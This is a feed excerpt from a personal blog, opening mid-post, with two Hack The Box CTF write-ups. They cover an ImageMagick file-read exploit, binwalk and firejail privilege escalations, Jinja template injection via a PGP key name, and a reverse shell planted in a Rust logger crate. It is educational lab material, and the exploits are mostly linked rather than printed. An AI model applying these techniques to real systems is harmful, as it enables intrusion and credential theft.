&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.11.219/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ~/tools/SecLists/Discovery/Web-Content/common.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That yielded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; folders, I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git-dumper&lt;/code&gt; to dump the whole repository. Upon investigating the source code of the application, I’ve noticed a user called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;emily&lt;/code&gt;. I also discovered an executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magick&lt;/code&gt; and this fragmet of code:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$newname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;uniqid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$newname&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getFullPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program seems to be invoking this binary to shrink the image that is being uploaded through the website, the program itself is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImageMagick 7.1.0-49 beta&lt;/code&gt; we discover that by invoking it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-version&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./magick &lt;span class=&quot;nt&quot;&gt;-version&lt;/span&gt;
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
Delegates &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;built-in&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This version is vulnerable to Arbitrary Remote Leak, https://www.metabaseq.com/imagemagick-zero-days/.&lt;/p&gt;

&lt;p&gt;Furthermore, we notice some files of interest in the source code as well, such as the database file.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PDO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sqlite:/var/db/pilgrimage&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;

&lt;p&gt;I’ve used this PoC to generate my payload: https://github.com/Sybil-Scan/imagemagick-lfi-poc&lt;/p&gt;

&lt;p&gt;I’ve crafted my malicious image to read the database file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/db/pilgrimage&lt;/code&gt; and shrink it through the website, I’ve then downloaded the file and converted the bytes, opened it and after some digging I found the password for user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;emiliy&lt;/code&gt;. Then you can login with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;getting-root&quot;&gt;Getting root&lt;/h1&gt;

&lt;p&gt;I’ve used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to enumerate the system, and I’ve noticed a process running:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root         726  0.0  0.0   6816  3072 ?        Ss   15:00   0:00 /bin/bash /usr/sbin/malwarescan.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I checked the permissions of the script:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/sbin/malwarescan.sh
&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then I saw the script itself:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/sbin/malwarescan.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;blacklist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Executable script&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Microsoft executable&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

/usr/bin/inotifywait &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; create /var/www/pilgrimage.htb/shrunk/ | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;FILE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/pilgrimage.htb/shrunk/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | /usr/bin/tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | /usr/bin/sed &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/^.*CREATE //p&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;binout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/usr/local/bin/binwalk &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;banned &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blacklist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[@]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
		if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$binout&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$banned&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
			/usr/bin/rm &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
			&lt;span class=&quot;nb&quot;&gt;break
		&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
	done
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script seems to be invoking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, I searched for some exploits and I found this one: https://www.exploit-db.com/exploits/51249 following the steps in the exploit, I’ve set up a listener and placed the malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;png&lt;/code&gt; crafted by the exploit in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/pilgrimage.htb/shrunk/&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:/tmp/syl&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a couple of seconds, my listener got a connection, which was with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;

&lt;h1 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h1&gt;

&lt;p&gt;I wanted to investigate a little further how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magick&lt;/code&gt; binary includes the file that it converts and this article explains it perfectly.&lt;/p&gt;

&lt;p&gt;https://www.metabaseq.com/imagemagick-zero-days/&lt;/p&gt;

&lt;p&gt;The exploit targets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tEXt&lt;/code&gt; chunk of the PNG file, and this chunk is being used for storing key-value metadata for the PNG file. The problem comes whenever you use the “profile” string into that metadata, if that is being used as “key” the “value” is being interpreted as a filename, that then the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileToStringInfo&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileToBlob&lt;/code&gt; will fetch from the system, and it will populate the “value” with the file’s contents.&lt;/p&gt;

&lt;p&gt;And to add some speculation on top of it, this almost feels like a backdoor ;).&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I started off with rustscan</summary></entry><entry><title type="html">Hack The Box - Sandworm [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm.html" rel="alternate" type="text/html" title="Hack The Box - Sandworm [Medium]" /><published>2023-06-24T00:00:00+03:00</published><updated>2023-06-24T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm.html">&lt;p&gt;I began with a simple scan, to check the ports of the machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rustscan &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
Open 10.10.11.218:22
Open 10.10.11.218:80
Open 10.10.11.218:443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went to the website that is being hosted on port 80, and I saw that there is some sort of PGP stuff. Furthermore, I noticed the following URLs:&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;https://ssa.htb/login
https://ssa.htb/
https://ssa.htb/pgp # the site&apos;s public key
https://ssa.htb/guide # some sort of playground for PGP
https://ssa.htb/contact
https://ssa.htb/guide/verify
https://ssa.htb/about
https://ssa.htb/login?next=%2Fadmin
https://ssa.htb/guide/encrypt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/guide&lt;/code&gt; endpoint there is some sort of playground for PGP, and while I was playing with it, I have noticed that when I am using the verify signature there is output that looked like pulled from the console.&lt;/p&gt;

&lt;p&gt;I’ve enumerated the technologies and versions that the website is using, I found that it used Flask as the main server application and (possibly Flask for the frontend/templating engine).&lt;/p&gt;

&lt;h2 id=&quot;rce&quot;&gt;RCE&lt;/h2&gt;

&lt;p&gt;When I saw Flask I thought that the application could be using Jinja, so I immediately thought that this could be a potential &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&quot;&gt;SSTI&lt;/a&gt;. 
I had only a single entry point that could give me output which was through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Verify Signature&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/guide&lt;/code&gt; endpoint.&lt;/p&gt;

&lt;h3 id=&quot;crafting-the-exploit&quot;&gt;Crafting the exploit&lt;/h3&gt;

&lt;p&gt;The injection point is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; of the PGP key, so I’ve generated a key called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gpg &lt;span class=&quot;nt&quot;&gt;--gen-key&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The exploit is described/explained &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After that, we need to export the public key using this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gpg &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; public_key.key &lt;span class=&quot;nt&quot;&gt;--export&lt;/span&gt; syl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then we should craft an arbitrary message:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;test&apos;&lt;/span&gt; | gpg &lt;span class=&quot;nt&quot;&gt;--clear-sign&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h3 id=&quot;common-issues&quot;&gt;Common Issues&lt;/h3&gt;

&lt;p&gt;While crafting this, I’ve experienced serious hassles such as:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;wrongfully crafting the message&lt;/li&gt;
  &lt;li&gt;using different key to encrypt the message&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I fixed those issues when I started clean and using only 1 key, and whenever asked for anything “passphrase/name” I just typed “syl”.&lt;/p&gt;

&lt;p&gt;To check the current keys that you have:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gpg --list-keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another useful website is this one: https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/ I’ve used the article to modify the name of the key, and then to export the public key again.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Upon crafting the message, paste the message and the public key and click to verify the signature, this would get you a reverse shell to the machine.&lt;/p&gt;

&lt;h2 id=&quot;atlas-firejailed&quot;&gt;Atlas (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firejailed&lt;/code&gt;)&lt;/h2&gt;

&lt;p&gt;The user that we got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas&lt;/code&gt; is actually is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firejailed&lt;/code&gt;, commands such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget/curl&lt;/code&gt; are not available in the environment. The pivot point is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt; directory in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$HOME&lt;/code&gt; folder. There you can find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.json&lt;/code&gt; file where the SSH credentials for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;silentobserver&lt;/code&gt; are.&lt;/p&gt;

&lt;h2 id=&quot;silentobserver&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;silentobserver&lt;/code&gt;&lt;/h2&gt;

&lt;p&gt;I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to check where would my next pivoting point would be, I stumbled fairly fast on these files that I could write:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/crates/logger/src
/opt/crates/logger/src/lib.rs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I noticed the application located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt&lt;/code&gt; directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tipnet/&lt;/code&gt; I’ve examined the source code, and it is some sort of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rust&lt;/code&gt; application, I already got a hint to those writable directories and whenever I saw the source code:&lt;/p&gt;

&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;crate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keywords&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;justification&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Invoking it later on.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I knew that I could modify the crate that could be executed by the application.&lt;/p&gt;

&lt;p&gt;But what is this application? And where is it running?&lt;/p&gt;

&lt;h2 id=&quot;tipnet-application&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tipnet&lt;/code&gt; Application&lt;/h2&gt;

&lt;p&gt;This application is running like that:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh -c cd /opt/tipnet &amp;amp;&amp;amp; bin/echo &quot;e&quot; | /bin/sudo -u atlas /usr/bin/cargo run --offline sleep 10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas(not firejailed)&lt;/code&gt; is running it, so this could be our next attack vector.&lt;/p&gt;

&lt;p&gt;I’ve crafted a rust reverse shell: https://doc.rust-lang.org/std/process/struct.Command.html and added it into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logger/src/lib.rs&lt;/code&gt; file then I build the crate using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cargo build&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some seconds, your listener should be getting a connection from the server, that would be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas&lt;/code&gt; user.&lt;/p&gt;

&lt;h1 id=&quot;atlas-user-to-root&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Atlas&lt;/code&gt; user to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/h1&gt;

&lt;p&gt;Fairly simple and straightforward, this is a &lt;a href=&quot;https://github.com/advisories/GHSA-m2xv-wgqg-4gxh&quot; title=&quot;CVE-2022-31214&quot;&gt;CVE-2022-31214&lt;/a&gt; vulnerability. You can use the already crafted exploits for that:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://www.openwall.com/lists/oss-security/2022/06/08/10&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are issues with that exploit, I believe it is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wait&lt;/code&gt; mechanism. To make sure that it is working correctly add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;breakpoint()&lt;/code&gt; in the beginning of the script then you can follow the execution by pressing “n”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/htb/htb-sandworm-firejail.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I began with a simple scan, to check the ports of the machine.</summary></entry></feed>